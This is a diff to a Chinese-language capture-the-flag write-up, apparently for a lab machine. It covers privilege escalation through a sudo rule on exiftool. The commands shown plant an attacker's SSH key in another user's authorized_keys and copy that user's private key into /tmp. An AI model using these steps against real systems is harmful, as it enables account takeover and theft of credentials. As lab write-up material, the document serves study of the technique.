@@ -100,6 +100,18 @@ sudo -l
 
 ```
 
+https://medium.com/@josemlwdf/thewall-eb99f02e1502
+
+[Linux CentOS 8.x 生成rsa公私密钥\_linux生成公钥私钥-CSDN博客](https://blog.csdn.net/hkl_Forever/article/details/127422236)
+
+[linux ssh公钥免密码登录 - zqifa - 博客园](https://www.cnblogs.com/zqifa/p/ssh-1.html)
+
+
+```c
+┌──(root㉿kali)-[~/.ssh]
+└─# ssh-keygen -t rsa
+```
+
 我们在/tmp/下创建一个id_rsa.pub，然后使用exiftool将“id rsa.pub”复制到“authorized_key”中
 ```c
 echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8hH4Hco6cXEFfQ93KrvQBQ2T+VFaYsxqjENfNdKJvJkoxQD8sn8/5noKVUiWfqv/bn65uivoNh3cZf8AW1afXI/uAAbIHrjPKZM69cScSg2j1F6pgijwwROtuAQIcdyZdiWD8We1j1d1VrOcYV8DmD3+TUKqxrCwuUC1mzBBs2XebKaUj13saSqUZfvWjEaGwnTpXczZqzuDef5ykw2EQzk6RbZ0vhImR7MmgkpAC26PmWeXMcrdmN52l26YcJT3ERLcmCQjZeYwg06RB+0UmwGK5HfFojHuzRKjfaDjWipbKo065lOGZoCF4R4fuXiFjMbcbMJMvUiEhyBnAD2e8FYRdlXd8bv66+1w1Fmg7z8oGZOfJfY++koUGhTHW7yhVECvGvHuBsBDJqdKVl4I7jBY9z0pAuyeogv3KxjdQpnaCXB47HzTKgGFBfxAqzmvUde7SwrIgjXLJrTPzA7rzJvcso/n+4o+fY73jyKUgbh6P/RYSHSxd5RhFVrhu00M= root@kali
@@ -108,11 +120,11 @@ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8hH4Hco6cXEFfQ93KrvQBQ2T+VFaYsxqjEN
 sudo -u john /usr/bin/exiftool -filename=/home/john/.ssh/authorized_keys /tmp/id_rsa.pub
 ```
 
-https://medium.com/@josemlwdf/thewall-eb99f02e1502
+[exiftool | GTFOBins](https://gtfobins.github.io/gtfobins/exiftool/#sudo)
 
 换一个思路读取ssh私钥
 ```c
 sudo -u john /usr/bin/exiftool -filename=/tmp/idrsa /home/john/.ssh/id_rsa
 ```
 
-sudo -u john /usr/bin/exiftool -filename=/tmp/idrsa /home/john/.ssh/authorized_keys
+
